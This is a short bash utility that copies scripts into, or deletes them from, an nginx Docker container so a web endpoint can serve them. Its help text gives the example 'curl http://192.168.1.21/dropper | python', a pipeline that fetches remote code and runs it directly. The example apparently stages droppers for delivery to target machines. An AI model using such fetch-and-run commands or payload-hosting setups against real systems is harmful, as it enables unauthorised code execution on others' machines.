#!/usr/bin/env bash

# --- Function to display usage information ---
usage() {
    # Using a "here document" (cat << EOF) for a cleaner multi-line string
    cat << EOF
This script is used to copy a script to the Flask App endpoint.
This allows you to do things like: "curl http://192.168.1.21/dropper | python"

Usage:
  ./host_file.sh <command> [argument]

Commands:
  install <script_path>   Copies the specified script to the container.
  delete  <script_name>   Deletes the specified script from the container.
  help                    Shows this help message.

Examples:
  ./host_file.sh install ./myscript.py
  ./host_file.sh delete myscript.py
EOF
    # Exit with a non-zero status code to indicate an issue
    exit 1
}


# --- Main script logic ---

# Check for no arguments, or if the first argument is a help flag
# A case statement is cleaner and more scalable than multiple "||" conditions.
case "$1" in
    ""|--help|-h|help)
        usage
        ;;
esac

MODE="$1"
FILE="$2"

case "$MODE" in
    install)
        # Check if the second argument (the file) is provided
        if [[ -z "$FILE" ]]; then
            echo "Error: Missing file path for 'install' command." >&2
            usage
        fi
        # Check if the file actually exists before trying to copy it
        if [[ ! -f "$FILE" ]]; then
            echo "Error: File not found: $FILE" >&2
            exit 1
        fi
        echo "Installing '$FILE'..."
        /usr/bin/sudo /usr/bin/docker cp "$FILE" nginx:/etc/nginx/scripts/
        ;;

    delete)
        # Check if the second argument (the file name) is provided
        if [[ -z "$FILE" ]]; then
            echo "Error: Missing file name for 'delete' command." >&2
            usage
        fi
        echo "Deleting '$FILE' from container..."
        # Use basename to ensure we only get the filename, not a path
        /usr/bin/sudo /usr/bin/docker exec -it nginx rm "/etc/nginx/scripts/$(basename "$FILE")"
        ;;

    *)
        # Catches any command that isn't 'install' or 'delete'
        echo "Error: Unknown command '$MODE'" >&2
        usage
        ;;
esac

# If the script reaches this point, the command was successful
echo "Operation '$MODE' completed successfully."
